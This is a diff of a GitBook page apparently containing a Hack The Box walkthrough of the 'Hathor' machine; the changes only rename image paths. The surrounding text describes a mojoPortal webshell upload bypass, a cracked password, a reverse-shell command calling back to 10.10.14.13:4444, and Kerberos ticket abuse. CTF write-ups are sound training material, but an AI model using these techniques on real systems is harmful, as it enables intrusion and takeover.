@@ -97,19 +97,19 @@ The first thing we notice is the domain name, which is `hathor.windcorp.htb`. Th
 
 Port 80 shows a corporate page that is still under construction:
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (4).png" alt=""><figcaption></figcaption></figure>
 
 At the bottom of the page, there's a link that brings us to a login page on the website:
 
-<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (15) (3).png" alt=""><figcaption></figcaption></figure>
 
 Viewing the page source reveals this is a mojoPortal instance:
 
-<figure><img src="../../../.gitbook/assets/image (2) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 A quick Google search for mojoPortal exploits and default credentials led to this:
 
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>
 
 Surprisingly, this worked!
 
@@ -117,15 +117,15 @@ Surprisingly, this worked!
 
 The administrator panel lets us edit the pages and what is shown:
 
-<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (5).png" alt=""><figcaption></figcaption></figure>
 
 This is an IIS server, so uploading an `.aspx` reverse shell might work. Head to File Manager > Upload Files:
 
-<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (4).png" alt=""><figcaption></figcaption></figure>
 
 When trying to upload, it doesn't work.
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 If we change it to `cmd.txt`, it works.&#x20;
 
@@ -137,11 +137,11 @@ Then it shows up here:
 
 Interestingly, there's a Move function as well, and we can try moving this to be `cmd.aspx`.
 
-<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can try to rename it as `cmd.aspx`, and it seems to work:
 
-<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
 
 Turns out this is actually a CVE:
 
@@ -149,7 +149,7 @@ Turns out this is actually a CVE:
 
 Anyways, we can access our webshell using this CVE:
 
-<figure><img src="../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 However, getting **ANY** shell fails to work. Similar to Sekhmet (which I actually solved before this), there's some kind of firewall in use here that is blocking us.
 
@@ -189,7 +189,7 @@ Insomnia shell is a fully implemented web shell that can give us a reverse shell
 
 Using this, we can get a reverse shell as `web`.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (3) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## GinaWild Shell
 
@@ -265,7 +265,7 @@ active;weak;regular;BeatriceMill;S-1-5-21-3783586571-2109290616-3725730865-5992;
 
 This is crackable:
 
-<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (5).png" alt=""><figcaption></figcaption></figure>
 
 `!!!!ilovegood17` is the password here.
 
@@ -527,7 +527,7 @@ system("cmd.exe /c C:\\share\\Bginfo64.exe -e cmd.exe 10.10.14.13 4444");
 
 After waiting for a little bit, we will get a shell back!
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (4).png" alt=""><figcaption></figcaption></figure>
 
 We can now grab the user flag.&#x20;
 
@@ -657,11 +657,11 @@ Set-AuthenticodeSignature .\Get-bADpasswords.ps1 $pfx
 
 This script should let us know that we have imported it:
 
-<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (14) (6).png" alt=""><figcaption></figcaption></figure>
 
 It should also let us know that we have signed it successfully:
 
-<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 Then, there's a `run.vbs` script that looks like it executes the file:
 
@@ -676,7 +676,7 @@ WshShell.Run Command
 
 We can simply use `cscript ./run.vbs` to run this, and we would get another reverse shell:
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>
 
 ## Root Shell
 
@@ -738,6 +738,6 @@ $ export KRB5CCNAME=administrator@windcorp.htb.ccache
 
 Then, we can use this ticket to get a shell using this ticket:
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (4).png" alt=""><figcaption></figcaption></figure>
 
 Rooted! Although hard, this machine had steps that were simple if the enumeration was done properly. Great machine!&#x20;
